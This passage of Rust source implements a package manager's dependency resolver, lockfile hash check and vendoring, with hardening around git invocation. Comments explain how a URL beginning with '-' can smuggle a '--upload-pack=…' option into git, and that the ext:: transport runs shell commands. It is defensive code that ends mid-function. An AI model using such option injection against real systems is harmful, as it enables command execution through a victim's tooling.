//! `kitec pkg` — resolve what a manifest asks for, and write down what was
//! resolved.
//!
//! This is the only thing in the toolchain that fetches anything, and it does
//! so only when asked. A build never reaches the network: it reads
//! `.kite/vendor`, which this put there.
//!
//! There is no post-install script and no build-time code execution, because
//! there is nowhere to put one — a dependency is `.kite` files. That is the
//! npm supply-chain surface removed by construction rather than by policy.
//!
//! Versions are resolved before anything is hashed. Every requirement on a
//! name — from the root manifest and from every dependency's own — is
//! satisfied by the one version the lockfile records; the solver lives in
//! `kite_driver::solve`, and this file is its [`Registry`]: paths on disk,
//! and tags read with `git ls-remote`. A candidate under consideration is
//! cloned into `.kite/vendor/<name>@<version>`; the version chosen is then
//! placed at `.kite/vendor/<name>`, the one directory per name a build reads,
//! which is the no-hoisting stance on disk.

use kite_driver::manifest::{self, Locked, Manifest, Source};
use kite_driver::semver::Version;
use kite_driver::solve::{self, Registry};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitCode};

/// Where dependencies are put, relative to the manifest.
const VENDOR: &str = ".kite/vendor";

pub fn run(dir: &Path, offline: bool, update: bool) -> ExitCode {
    match sync(dir, offline, update) {
        Ok(manifest) => check_entries(&manifest, dir),
        Err(message) => {
            eprintln!("error: {}", message);
            ExitCode::FAILURE
        }
    }
}

/// Resolve, compare against `kite.lock`, and — only if that comparison
/// passes — install what was resolved and write the lockfile.
fn sync(dir: &Path, offline: bool, update: bool) -> Result<Manifest, String> {
    let manifest_path = dir.join("kite.toml");
    let Ok(text) = std::fs::read_to_string(&manifest_path) else {
        return Err(format!(
            "no `kite.toml` in {}\n\nnote: a package is a directory with a manifest in it",
            dir.display()
        ));
    };
    let manifest = manifest::parse(&text).map_err(|e| e.to_string())?;

    // **The lockfile is an input**, not only an output. It is read before
    // resolution, so the versions it records are preferred over newer ones
    // nobody asked for, and compared entry by entry afterwards.
    let lock_path = dir.join("kite.lock");
    let previous_text = std::fs::read_to_string(&lock_path).ok();
    let previous = match &previous_text {
        None => Vec::new(),
        Some(text) => match manifest::parse_lockfile(text) {
            Ok(entries) => entries,
            Err(_) if update => Vec::new(),
            Err(e) => {
                return Err(format!(
                    "`{}` does not read: {}\n\nnote: `kitec pkg --update` writes it again from \
                     what resolution finds",
                    lock_path.display(),
                    e
                ))
            }
        },
    };
    let preferred: BTreeMap<String, Version> = if update {
        BTreeMap::new()
    } else {
        previous
            .iter()
            .filter_map(|l| Version::parse(&l.version).ok().map(|v| (l.name.clone(), v)))
            .collect()
    };

    eprintln!("{} {}", manifest.name, manifest.version);
    let resolution = lock_dependencies(&manifest, dir, offline, update, &preferred)?;
    for entry in &resolution.locked {
        eprintln!("  {} {} {}", entry.name, entry.version, entry.hash);
    }

    // A dependency whose bytes changed under the same version and the same
    // source is an *error*, not a notice.
    //
    // The point of recording a hash is that the same version resolves to the
    // same bytes twice. What used to happen when it did not was that the new
    // hash was written over the old one, a line was printed to stderr, and the
    // command exited 0 — so a moved tag, a re-pushed repository, or a network
    // that answered differently was indistinguishable from a clean build to
    // anything reading the exit code, which is what CI reads. `--update` is
    // how a change gets accepted, because accepting one is a decision somebody
    // makes rather than something a build does on its way past.
    //
    // **Only that.** The lockfile used to be compared as a whole text, so
    // adding a dependency to `kite.toml` — or a version moving because the
    // manifest now asks for a different one — failed with the claim that a
    // dependency's contents had changed under the same version, which was not
    // true, and taught everyone to reach for `--update` by reflex.
    let changes = compare(&previous, &resolution.locked);
    for note in &changes.notes {
        eprintln!("  {}", note);
    }
    if !changes.moved.is_empty() && !update {
        // Deliberately not written: the committed lockfile is the record of
        // what was agreed to, and overwriting it here is what destroyed the
        // evidence that anything moved.
        //
        // Deliberately not installed either — `install` has not been called,
        // so `.kite/vendor/<name>` still holds the bytes that were agreed to
        // rather than the ones that turned up. Refusing while leaving the new
        // bytes where the next build reads them was a refusal in the exit
        // code only.
        return Err(format!(
            "`{}` does not match what resolution produced\n{}\n\n\
             note: a dependency's contents changed under the same version — a moved tag, a \
             re-pushed repository, or something answering for one\n\
             note: run `kitec pkg --update` to accept the new bytes and rewrite the lockfile",
            lock_path.display(),
            changes.moved.iter().map(|m| format!("  {}", m)).collect::<Vec<_>>().join("\n")
        ));
    }

    // Past the gate: the lockfile agrees with what resolution found, or
    // `--update` accepted that it does not. Only now do the resolved bytes go
    // where a build will read them.
    resolution.install()?;

    let text = manifest::lockfile(&resolution.locked);
    let previous_text = previous_text.unwrap_or_default();
    if previous_text != text {
        std::fs::write(&lock_path, &text)
            .map_err(|e| format!("cannot write `{}`: {}", lock_path.display(), e))?;
    }
    if previous_text.is_empty() {
        eprintln!("wrote kite.lock");
    } else if !changes.moved.is_empty() {
        eprintln!("kite.lock changed — a dependency is not what it was");
    } else if previous_text != text {
        eprintln!("kite.lock updated");
    } else {
        eprintln!("kite.lock is unchanged");
    }
    Ok(manifest)
}

/// How a resolution differs from the lockfile before it.
#[derive(Debug, Default, PartialEq)]
struct Changes {
    /// Same name, version and source, different bytes: what the lockfile
    /// exists to catch.
    moved: Vec<String>,
    /// Everything else that changed, which is a manifest having changed and
    /// is said rather than refused.
    notes: Vec<String>,
}

fn compare(previous: &[Locked], now: &[Locked]) -> Changes {
    let mut changes = Changes::default();
    for entry in now {
        match previous.iter().find(|p| p.name == entry.name) {
            None => changes.notes.push(format!("added {} {}", entry.name, entry.version)),
            Some(p) if p.version != entry.version => changes
                .notes
                .push(format!("{} {} → {}", entry.name, p.version, entry.version)),
            Some(p) if p.source != entry.source => changes.notes.push(format!(
                "{} {} now comes from {} (was {})",
                entry.name, entry.version, entry.source, p.source
            )),
            Some(p) if p.hash != entry.hash => changes.moved.push(format!(
                "{} {}: {} was {}",
                entry.name, entry.version, entry.hash, p.hash
            )),
            Some(_) => {}
        }
    }
    for p in previous {
        if !now.iter().any(|entry| entry.name == p.name) {
            changes.notes.push(format!("removed {} {}", p.name, p.version));
        }
    }
    changes
}

/// Every target's entry must exist, because a manifest that names a file that
/// is not there is a manifest nobody has run.
fn check_entries(manifest: &Manifest, dir: &Path) -> ExitCode {
    let mut missing = Vec::new();
    for (name, target) in &manifest.targets {
        if !dir.join(&target.entry).exists() {
            missing.push(format!("  {} → {}", name, target.entry));
        }
    }
    if missing.is_empty() {
        return ExitCode::SUCCESS;
    }
    eprintln!("error: a target names an entry that does not exist:\n{}", missing.join("\n"));
    ExitCode::FAILURE
}

/// What resolution decided, before any of it is installed.
///
/// Kept apart so that the lockfile can be compared against a resolution that
/// has not yet touched `.kite/vendor/<name>`: [`Resolution::install`] is the
/// only thing that writes there, and `run` does not call it until the
/// comparison has passed.
#[derive(Debug)]
struct Resolution {
    locked: Vec<Locked>,
    vendor: Vendor,
    chosen: Vec<solve::Resolved>,
}

impl Resolution {
    /// Place every resolved git dependency where a build will read it. Called
    /// only once the lockfile agrees with what was resolved.
    fn install(&self) -> Result<(), String> {
        for resolved in &self.chosen {
            self.vendor.place(&resolved.name, &resolved.version)?;
        }
        Ok(())
    }
}

/// Resolve every dependency, direct and transitive, and hash what resolution
/// chose. The returned entries are what the lockfile records.
///
/// Hashing reads the checkout a candidate was cloned into rather than the
/// directory a build reads, so resolving and hashing are answers about the
/// world rather than changes to it.
fn lock_dependencies(
    root: &Manifest,
    dir: &Path,
    offline: bool,
    update: bool,
    preferred: &BTreeMap<String, Version>,
) -> Result<Resolution, String> {
    let mut vendor = Vendor::new(dir, offline, update);
    for dep in &root.dependencies {
        let origin = Origin::of(&vendor.root, &dep.source);
        vendor.register(ROOT, &dep.name, origin)?;
    }
    let chosen = solve::resolve_preferring(root, &mut vendor, preferred)?;

    let mut locked = Vec::new();
    for resolved in &chosen {
        let source = vendor.source_dir(&resolved.name, &resolved.version)?;
        let hash = manifest::hash_directory(&source)
            .map_err(|e| format!("cannot read `{}`: {}", source.display(), e))?;
        locked.push(Locked {
            name: resolved.name.clone(),
            version: resolved.version.to_string(),
            source: vendor.lock_source(&resolved.name, &resolved.version),
            hash,
        });
    }
    Ok(Resolution { locked, vendor, chosen })
}

// ---------------------------------------------------------------------------
// The registry: paths on disk, and git tags
// ---------------------------------------------------------------------------

/// Where a dependency name comes from, learned from the manifests naming it.
#[derive(Clone, Debug, PartialEq)]
enum Origin {
    /// An absolute directory.
    Path(PathBuf),
    Git { url: String, tag: Option<String> },
}

impl Origin {
    /// A manifest's source, made absolute against the directory the manifest
    /// sits in — two manifests reaching one directory by different relative
    /// paths are naming the same place, and should be recognised as such.
    fn of(dir: &Path, source: &Source) -> Origin {
        match source {
            Source::Path(path) => {
                let joined = dir.join(path);
                Origin::Path(joined.canonicalize().unwrap_or(joined))
            }
            Source::Git { url, tag } => Origin::Git { url: url.clone(), tag: tag.clone() },
        }
    }
}

impl std::fmt::Display for Origin {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Origin::Path(path) => write!(f, "{}", path.display()),
            Origin::Git { url, tag: Some(tag) } => write!(f, "{}#{}", url, tag),
            Origin::Git { url, tag: None } => write!(f, "{}", url),
        }
    }
}

/// Who a registration is from when it is the root manifest's, which nothing
/// unwinds.
const ROOT: &str = "";

/// The real [`Registry`]: what exists on disk and at the ends of git URLs.
#[derive(Debug)]
struct Vendor {
    /// The root package's directory, canonicalised so vendored paths display
    /// relative to it.
    root: PathBuf,
    offline: bool,
    /// `--update`: a checkout already on disk is fetched again rather than
    /// trusted. It never was — a candidate directory that existed was used as
    /// it stood — so `--update` could not see a moved tag it was meant to
    /// accept, and hashed the bytes it had fetched the first time.
    update: bool,
    /// Checkouts fetched in this run, so each is fetched once.
    refreshed: BTreeSet<PathBuf>,
    /// Where each name comes from, and which manifest said so — the root's is
    /// [`ROOT`], a dependency's is its `name version`. Kept per requirer so
    /// that a candidate the solver gives up on can take back what its manifest
    /// taught; see [`Registry::unwind`].
    origins: BTreeMap<String, Vec<(String, Origin)>>,
    /// How each discovered version was spelled as a tag — `1.2.0` may be the
    /// tag `v1.2.0`, and the lockfile should quote what the repository says.
    tags: BTreeMap<(String, String), String>,
    /// Candidate checkouts already on disk, by (name, version).
    checkouts: BTreeMap<(String, String), PathBuf>,
    versions: BTreeMap<String, Vec<Version>>,
}

impl Vendor {
    fn new(dir: &Path, offline: bool, update: bool) -> Vendor {
        Vendor {
            root: dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf()),
            offline,
            update,
            refreshed: BTreeSet::new(),
            origins: BTreeMap::new(),
            tags: BTreeMap::new(),
            checkouts: BTreeMap::new(),
            versions: BTreeMap::new(),
        }
    }

    /// Learn where a name comes from, from the manifest of `by`.
    /// Disagreement is an error rather than something backtracked around: a
    /// name that means two things depending on which manifest is read is
    /// exactly the ambiguity resolution exists to refuse.
    fn register(&mut self, by: &str, name: &str, origin: Origin) -> Result<(), String> {
        let known = self.origins.entry(name.to_string()).or_default();
        let Some((_, existing)) = known.iter().find(|(_, o)| *o != origin) else {
            if !known.iter().any(|(who, _)| who == by) {
                known.push((by.to_string(), origin));
            }
            return Ok(());
        };
        match (existing, &origin) {
            (Origin::Git { url: a, tag: first }, Origin::Git { url: b, tag: second }) if a == b => {
                Err(match (first, second) {
                    (Some(x), Some(y)) => format!(
                        "`{}` is pinned to two different tags: `{}` and `{}`\n\nnote: a tag \
                         pins for everyone naming `{}` — agree on one, or switch both to \
                         `version = \"…\"` and let resolution choose",
                        name, x, y, name
                    ),
                    _ => format!(
                        "`{}` is pinned to a tag by one manifest and left to resolve by \
                         another\n\nnote: a pin binds everyone naming `{}`; give both \
                         manifests the tag, or neither",
                        name, name
                    ),
                })
            }
            _ => Err(format!(
                "`{}` is named from two different places:\n    {}\n    {}\n\nnote: a name \
                 means one thing — one of the manifests must rename or repoint it",
                name, existing, origin
            )),
        }
    }

    fn origin(&self, name: &str) -> Result<Origin, String> {
        self.origins.get(name).and_then(|known| known.first()).map(|(_, o)| o.clone()).ok_or_else(
            || format!("nothing says where `{}` comes from — no reachable kite.toml declares it", name),
        )
    }

    fn candidate_dir(&self, name: &str, version: &str) -> PathBuf {
        // A tag may contain `/`, which a directory name may not.
        let version = version.replace('/', "-");
        self.root.join(VENDOR).join(format!("{}@{}", vendor_name(name), version))
    }

    /// Read and parse a dependency's manifest.
    fn read_manifest(&self, name: &str, dir: &Path) -> Result<Manifest, String> {
        let path = dir.join("kite.toml");
        let Ok(text) = std::fs::read_to_string(&path) else {
            return Err(format!(
                "`{}` has no kite.toml at {} — resolution reads a dependency's manifest for \
                 its version and its own dependencies",
                name,
                dir.display()
            ));
        };
        manifest::parse(&text).map_err(|e| format!("`{}`: {}", name, e))
    }

    /// Read a candidate's manifest, and learn where its own dependencies come
    /// from — their relative paths are relative to *it*.
    ///
    /// Only the solver's choosing a candidate does this. Learning from a
    /// manifest merely read for its version would pin its dependencies'
    /// sources for a candidate that may never be chosen, and nothing would
    /// take that back.
    fn load_manifest(&mut self, name: &str, dir: &Path) -> Result<Manifest, String> {
        let parsed = self.read_manifest(name, dir)?;
        let by = requirer(name, &parsed.version);
        for dep in &parsed.dependencies {
            self.register(&by, &dep.name, Origin::of(dir, &dep.source))?;
        }
        Ok(parsed)
    }

    /// Make sure a tag's checkout is on disk — and, under `--update`, that it
    /// is what the remote says now rather than what it said last time.
    fn checkout(&mut self, name: &str, url: &str, tag: &str, dir: &Path) -> Result<(), String> {
        match fetch_plan(dir.exists(), self.update, self.refreshed.contains(dir), self.offline) {
            Fetch::Keep => return Ok(()),
            Fetch::Unavailable => return Err(self.not_vendored(name)),
            Fetch::Replace => replace_checkout(url, tag, dir)?,
            Fetch::Clone => clone(url, Some(tag), &dir.to_path_buf())?,
        }
        self.refreshed.insert(dir.to_path_buf());
        Ok(())
    }

    /// The version a manifest declares, which is the version the package has.
    fn declared_version(&self, name: &str, manifest: &Manifest) -> Result<Version, String> {
        if manifest.version.is_empty() {
            return Err(format!(
                "`{}`'s kite.toml declares no version, and resolution orders versions — add \
                 `version = \"0.1.0\"` under `[package]`",
                name
            ));
        }
        Version::parse(&manifest.version).map_err(|e| format!("`{}`'s kite.toml: {}", name, e))
    }

    fn not_vendored(&self, name: &str) -> String {
        format!(
            "`{}` is not in {} and `--offline` was given\n\nnote: run `kitec pkg` once \
             without `--offline` to fetch what resolution needs",
            name, VENDOR
        )
    }

    /// The one version a pinned tag has: clone it, read its manifest, and —
    /// when the tag itself spells a version — insist the two agree.
    fn pinned_version(&mut self, name: &str, url: &str, tag: &str) -> Result<Version, String> {
        let tagged = version_from_tag(tag);
        let dir = match &tagged {
            Some(v) => self.candidate_dir(name, &v.to_string()),
            None => self.candidate_dir(name, tag),
        };
        self.checkout(name, url, tag, &dir)?;
        let manifest = self.read_manifest(name, &dir)?;
        let declared = self.declared_version(name, &manifest)?;
        if let Some(tagged) = tagged {
            if tagged != declared {
                return Err(format!(
                    "tag `{}` of `{}` contains a manifest declaring {} — the tag and the \
                     manifest disagree about the version",
                    tag, name, declared
                ));
            }
        }
        self.tags.insert((name.to_string(), declared.to_string()), tag.to_string());
        self.checkouts.insert((name.to_string(), declared.to_string()), dir);
        Ok(declared)
    }

    /// Which versions of an unpinned git dependency are already vendored —
    /// all `--offline` has to offer.
    fn vendored_versions(&mut self, name: &str) -> Vec<Version> {
        let mut found = Vec::new();
        let Ok(entries) = std::fs::read_dir(self.root.join(VENDOR)) else { return found };
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let Some(rest) = file_name.strip_prefix(&format!("{}@", name)) else { continue };
            if let Ok(version) = Version::parse(rest) {
                self.checkouts.insert((name.to_string(), version.to_string()), entry.path());
                found.push(version);
            }
        }
        found
    }

    /// Where a resolved dependency's bytes are *now*: a path dependency where
    /// it lies, a git one in the `name@version` checkout it was cloned into.
    /// This is what gets hashed, and asking changes nothing on disk.
    fn source_dir(&self, name: &str, version: &Version) -> Result<PathBuf, String> {
        match self.origin(name)? {
            Origin::Path(dir) => Ok(dir),
            Origin::Git { .. } => {
                let key = (name.to_string(), version.to_string());
                Ok(self
                    .checkouts
                    .get(&key)
                    .cloned()
                    .unwrap_or_else(|| self.candidate_dir(name, &version.to_string())))
            }
        }
    }

    /// Put a resolved git dependency at `.kite/vendor/<name>`, the one
    /// directory per name a build reads. Refreshed only when it is not
    /// already the chosen version, so an unchanged resolution touches
    /// nothing.
    ///
    /// This is the destructive half, and it is deliberately not part of
    /// resolution. It used to be: hashing asked for the build directory, and
    /// asking for it removed the previous one and copied the new candidate
    /// over it — before `kite.lock` had been read, let alone agreed with. So
    /// a dependency whose bytes had moved under its version was installed,
    /// and *then* the mismatch was reported and the command exited non-zero.
    /// The exit code was the only thing that refused; the bytes were already
    /// in the directory the next `kitec run` compiles, and nothing on the
    /// build path reads the lockfile to notice. `--update` exists so that
    /// accepting changed bytes is a decision somebody makes, and installing
    /// them first is how that decision was made for them.
    fn place(&self, name: &str, version: &Version) -> Result<(), String> {
        let Origin::Git { .. } = self.origin(name)? else { return Ok(()) };
        let candidate = self.source_dir(name, version)?;
        let placed = self.root.join(VENDOR).join(vendor_name(name));
        if is_version(&placed, version)
            && manifest::hash_directory(&placed).ok() == manifest::hash_directory(&candidate).ok()
        {
            return Ok(());
        }
        if placed.exists() {
            std::fs::remove_dir_all(&placed)
                .map_err(|e| format!("cannot clear `{}`: {}", placed.display(), e))?;
        }
        copy_dir(&candidate, &placed)
            .map_err(|e| format!("cannot place `{}`: {}", placed.display(), e))?;
        Ok(())
    }

    /// The `source` line the lockfile shows for a resolved package.
    fn lock_source(&self, name: &str, version: &Version) -> String {
        match self.origin(name).ok().as_ref() {
            Some(Origin::Path(dir)) => relative_to(&self.root, dir),
            Some(Origin::Git { url, tag: Some(tag) }) => format!("{}#{}", url, tag),
            Some(Origin::Git { url, tag: None }) => {
                let key = (name.to_string(), version.to_string());
                match self.tags.get(&key) {
                    Some(tag) => format!("{}#{}", url, tag),
                    // Resolved offline from a vendored checkout, so the
                    // spelling of the tag was never seen; ask the checkout.
                    None => match self.checkouts.get(&key).and_then(|dir| describe_tag(dir)) {
                        Some(tag) => format!("{}#{}", url, tag),
                        None => format!("{}#{}", url, version),
                    },
                }
            }
            None => String::new(),
        }
    }
}

impl Registry for Vendor {
    fn versions(&mut self, name: &str) -> Result<Vec<Version>, String> {
        if let Some(known) = self.versions.get(name) {
            return Ok(known.clone());
        }
        let found = match self.origin(name)? {
            Origin::Path(dir) => {
                let manifest = self.read_manifest(name, &dir)?;
                let version = self.declared_version(name, &manifest)?;
                self.checkouts.insert((name.to_string(), version.to_string()), dir);
                vec![version]
            }
            Origin::Git { url, tag: Some(tag) } => vec![self.pinned_version(name, &url, &tag)?],
            Origin::Git { url, tag: None } => {
                if self.offline {
                    let vendored = self.vendored_versions(name);
                    if vendored.is_empty() {
                        return Err(self.not_vendored(name));
                    }
                    vendored
                } else {
                    let listed = tag_versions(&ls_remote(&url)?);
                    if listed.is_empty() {
                        return Err(format!(
                            "`{}` has no version tags at {}\n\nnote: resolution reads `git \
                             ls-remote --tags`; a version is a tag like `v1.2.0` or `1.2.0`, \
                             and a tag that is neither can be pinned with `tag = \"…\"`",
                            name, url
                        ));
                    }
                    let mut found = Vec::new();
                    for (version, tag) in listed {
                        self.tags.insert((name.to_string(), version.to_string()), tag);
                        found.push(version);
                    }
                    found
                }
            }
        };
        self.versions.insert(name.to_string(), found.clone());
        Ok(found)
    }

    fn manifest(&mut self, name: &str, version: &Version) -> Result<Manifest, String> {
        let key = (name.to_string(), version.to_string());
        match self.origin(name)? {
            Origin::Path(dir) => self.load_manifest(name, &dir),
            Origin::Git { url, .. } => {
                let dir = self
                    .checkouts
                    .get(&key)
                    .cloned()
                    .unwrap_or_else(|| self.candidate_dir(name, &version.to_string()));
                let tag = self.tags.get(&key).cloned().unwrap_or_else(|| version.to_string());
                self.checkout(name, &url, &tag, &dir)?;
                self.checkouts.insert(key.clone(), dir.clone());
                let manifest = self.load_manifest(name, &dir)?;
                let declared = self.declared_version(name, &manifest)?;
                if declared != *version {
                    let tag = self.tags.get(&key).cloned().unwrap_or_else(|| version.to_string());
                    return Err(format!(
                        "tag `{}` of `{}` contains a manifest declaring {} — the tag and the \
                         manifest disagree about the version",
                        tag, name, declared
                    ));
                }
                Ok(manifest)
            }
        }
    }

    fn unwind(&mut self, name: &str, version: &Version) {
        let by = requirer(name, &version.to_string());
        let mut forgotten = Vec::new();
        for (dep, known) in self.origins.iter_mut() {
            known.retain(|(who, _)| *who != by);
            if known.is_empty() {
                forgotten.push(dep.clone());
            }
        }
        // A name nobody names any more has no source; the versions listed for
        // the one it had are not its versions either.
        for dep in forgotten {
            self.origins.remove(&dep);
            self.versions.remove(&dep);
        }
    }
}

/// What to do about a candidate's checkout.
#[derive(Debug, PartialEq)]
enum Fetch {
    /// Use what is on disk.
    Keep,
    /// Nothing is on disk; clone it.
    Clone,
    /// Something is on disk and `--update` asked for the remote's answer
    /// rather than the one cached: remove it and clone again.
    Replace,
    /// Nothing is on disk and `--offline` forbids fetching it.
    Unavailable,
}

/// Whether a checkout is fetched, given what is on disk and what was asked.
///
/// Under `--update` a checkout on disk is fetched again, once per run —
/// otherwise `--update` accepted and hashed the bytes it had cached the first
/// time, and a moved tag it was meant to take could never be seen.
fn fetch_plan(exists: bool, update: bool, refreshed: bool, offline: bool) -> Fetch {
    match (exists, offline) {
        (true, true) => Fetch::Keep,
        (true, false) if update && !refreshed => Fetch::Replace,
        (true, false) => Fetch::Keep,
        (false, true) => Fetch::Unavailable,
        (false, false) => Fetch::Clone,
    }
}

/// How a registration names the manifest it came from.
fn requirer(name: &str, version: &str) -> String {
    let version = Version::parse(version).map(|v| v.to_string()).unwrap_or_else(|_| version.to_string());
    format!("{} {}", name, version)
}

/// `dir`, written the way a manifest would write it: relative to the root
/// package, climbing with `..` where it must. A lockfile is committed, and an
/// absolute path would make it differ per machine. Both paths arrive
/// canonicalised, so their components compare honestly.
fn relative_to(root: &Path, dir: &Path) -> String {
    let root_parts: Vec<_> = root.components().collect();
    let dir_parts: Vec<_> = dir.components().collect();
    let mut shared = 0;
    while shared < root_parts.len().min(dir_parts.len())
        && root_parts[shared] == dir_parts[shared]
    {
        shared += 1;
    }
    if shared == 0 {
        // Nothing in common — a different drive. Absolute is the truth then.
        return dir.display().to_string();
    }
    // Joined with `/` rather than by the platform's separator. A lockfile is
    // committed, and `../shared` on one machine and `..\shared` on another is
    // the same file disagreeing with itself — which is the whole thing writing
    // a relative path was meant to avoid. Every target reads `/` in a manifest,
    // so this is what a person would have written too.
    let mut parts: Vec<String> = Vec::new();
    for _ in shared..root_parts.len() {
        parts.push("..".to_string());
    }
    for part in &dir_parts[shared..] {
        parts.push(part.as_os_str().to_string_lossy().to_string());
    }
    if parts.is_empty() {
        ".".to_string()
    } else {
        parts.join("/")
    }
}

/// `v1.2.3` and `1.2.3` both spell a version; anything else is just a tag.
fn version_from_tag(tag: &str) -> Option<Version> {
    Version::parse(tag.strip_prefix('v').unwrap_or(tag)).ok()
}

/// The versions `git ls-remote --tags` shows, with the tag each was spelled
/// as. Peeled refs (`…^{}`) repeat the tag they peel and are skipped, as is
/// any tag that does not spell a version.
fn tag_versions(output: &str) -> Vec<(Version, String)> {
    let mut found: Vec<(Version, String)> = Vec::new();
    for line in output.lines() {
        let Some((_, reference)) = line.split_once('\t') else { continue };
        let Some(tag) = reference.trim().strip_prefix("refs/tags/") else { continue };
        if tag.ends_with("^{}") {
            continue;
        }
        if let Some(version) = version_from_tag(tag) {
            if !found.iter().any(|(v, _)| *v == version) {
                found.push((version, tag.to_string()));
            }
        }
    }
    found
}

/// The one network read resolution performs, and only for a git dependency
/// whose version is left to be chosen.
fn ls_remote(url: &str) -> Result<String, String> {
    check_url(url)?;
    let mut command = Command::new("git");
    hardened(&mut command);
    // `--` before the URL: without it a string beginning with `-` is an option,
    // and `git ls-remote --tags --upload-pack=…` with no repository left falls
    // back to the current directory's own remote while honouring it.
    let out = command
        .args(["ls-remote", "--tags", "--"])
        .arg(url)
        .output()
        .map_err(|e| format!("cannot run `git`: {}", e))?;
    if !out.status.success() {
        return Err(format!(
            "listing tags of {} failed:\n{}",
            url,
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// What tag a checkout was cloned from — a local question, answerable under
/// `--offline`.
fn describe_tag(dir: &Path) -> Option<String> {
    let out = Command::new("git")
        .args(["-C"])
        .arg(dir)
        .args(["describe", "--tags", "--exact-match"])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let tag = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if tag.is_empty() { None } else { Some(tag) }
}

/// Fetch a checkout again, over the one already on disk.
///
/// **Into a fresh directory first.** The old checkout used to be removed and
/// the clone started after it, so a fetch that failed — the network down, the
/// remote gone — left nothing: the `--update` failed, and so did every
/// `--offline` after it, over a checkout that had been there and worked. The
/// clone lands beside the old one, and replaces it only once it exists.
fn replace_checkout(url: &str, tag: &str, dir: &Path) -> Result<(), String> {
    let mut fresh = dir.as_os_str().to_owned();
    fresh.push(".fetching");
    let fresh = PathBuf::from(fresh);
    // Left over from a run that was interrupted, and never a checkout.
    if fresh.exists() {
        std::fs::remove_dir_all(&fresh)
            .map_err(|e| format!("cannot clear `{}`: {}", fresh.display(), e))?;
    }
    if let Err(why) = clone(url, Some(tag), &fresh) {
        let _ = std::fs::remove_dir_all(&fresh);
        return Err(format!(
            "{}\n\nnote: `{}` is left as it was, so `--offline` still has it",
            why,
            dir.display()
        ));
    }
    std::fs::remove_dir_all(dir).map_err(|e| format!("cannot clear `{}`: {}", dir.display(), e))?;
    std::fs::rename(&fresh, dir)
        .map_err(|e| format!("cannot place `{}`: {}", dir.display(), e))
}

/// Whether the placed checkout already declares the chosen version.
fn is_version(dir: &Path, version: &Version) -> bool {
    let Ok(text) = std::fs::read_to_string(dir.join("kite.toml")) else { return false };
    let Ok(parsed) = manifest::parse(&text) else { return false };
    Version::parse(&parsed.version).is_ok_and(|declared| declared == *version)
}

/// Copy a checkout into place, leaving `.git` behind: the build wants the
/// files, and the history is the candidate directory's to keep.
///
/// Symbolic links are refused rather than followed. `Path::is_dir` and
/// `fs::copy` both answer about what a link points at, and what is being
/// copied here was just fetched from a URL: a directory link aimed at `.`
/// recurses until the stack ends, and a file link aimed anywhere on the
/// machine copies that file into the tree the next build reads. The same
/// refusal runs in `hash_directory`, so what is copied and what is hashed
/// agree about what a tree is allowed to contain.
fn copy_dir(src: &Path, dst: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let name = entry.file_name();
        if name == ".git" {
            continue;
        }
        let kind = entry.file_type()?;
        let from = entry.path();
        let to = dst.join(&name);
        if kind.is_symlink() {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!("`{}` is a symbolic link", from.display()),
            ));
        }
        if kind.is_dir() {
            copy_dir(&from, &to)?;
        } else {
            std::fs::copy(&from, &to)?;
        }
    }
    Ok(())
}

/// A name, checked again at the moment it becomes a path.
///
/// `kite.toml`'s parser already refuses a name that is not ASCII letters,
/// digits, `-` and `_`, so this can never fire — which is the point of having
/// it. What is joined here is deleted recursively and written into, so a name
/// that ever escaped `.kite/vendor` would be an arbitrary-file-overwrite, and
/// the cost of proving it cannot is one comparison. A check at the parser and
/// a check at the sink are not redundant: the first gives a good diagnostic,
/// the second survives someone adding a second way in.
fn vendor_name(name: &str) -> &str {
    let mut parts = Path::new(name).components();
    let one = matches!(parts.next(), Some(std::path::Component::Normal(_))) && parts.next().is_none();
    assert!(
        one,
        "`{}` is not a single path component; kite.toml's parser should have refused it",
        name
    );
    name
}

/// Whether a git URL is one this will hand to `git`.
///
/// Two things are being refused, and only the second is obvious.
///
/// A URL beginning with `-` is not a URL, it is an **option**. `git ls-remote
/// --tags --upload-pack=…` leaves git no repository argument, so it falls back
/// to the current directory's own remote and honours the injected option —
/// which, against a local-transport remote, runs a command. The `--` separator
/// below stops that too; this refuses it earlier, with something to read.
///
/// The scheme is allow-listed rather than deny-listed because the dangerous
/// set is not enumerable: `ext::` runs a shell command, and git has had others.
/// Modern git denies `ext` by default, so this is not the only thing standing
/// in the way — but a dependency's URL is attacker-controlled *transitively*,
/// through a manifest nobody in this project wrote, and defending that on the
/// remote end's default configuration is not defending it.
fn check_url(url: &str) -> Result<(), String> {
    if url.starts_with('-') {
        return Err(format!(
            "`{}` begins with `-`, so `git` would read it as an option rather than a repository",
            url
        ));
    }
    // `http://` and `git://` are gone, and their absence is the point.
    //
    // Neither authenticates the far end or protects what comes back, so
    // anyone on the path answers instead of the host and decides what gets
    // compiled — and what a `kitec pkg` fetches is *run* by the next `kitec
    // run` or `kitec test`. The lockfile does not stand in the way of that: it
    // records a digest of whatever arrived.
    //
    // This is not a choice the project's author gets to weigh, either, which
    // is what settles it. As the comment above says, the URL comes from a
    // manifest "a dependency's dependency wrote" — so a transitive package
    // could opt its dependents into cleartext, and they had no way to refuse.
    const SCHEMES: [&str; 2] = ["https://", "ssh://"];
    if SCHEMES.iter().any(|s| url.starts_with(s)) {
        return Ok(());
    }
    if url.starts_with("http://") || url.starts_with("git://") {
        return Err(format!(
            "`{}` is fetched over a transport with no authentication\n  `http://` and `git://` \
             carry no proof the answer came from that host and no check that it arrived \
             unaltered, and a dependency's source is compiled and run — use `https://` or \
             `ssh://`",
            url
        ));
    }
    // `user@host:path`, which is the other spelling everyone writes. It has no
    // scheme, so it is recognised by shape: something, an `@`, then a `:`.
    let scp_like = url
        .split_once('@')
        .is_some_and(|(user, rest)| !user.is_empty() && rest.contains(':') && !rest.contains("::"));
    if scp_like {
        return Ok(());
    }
    Err(format!(
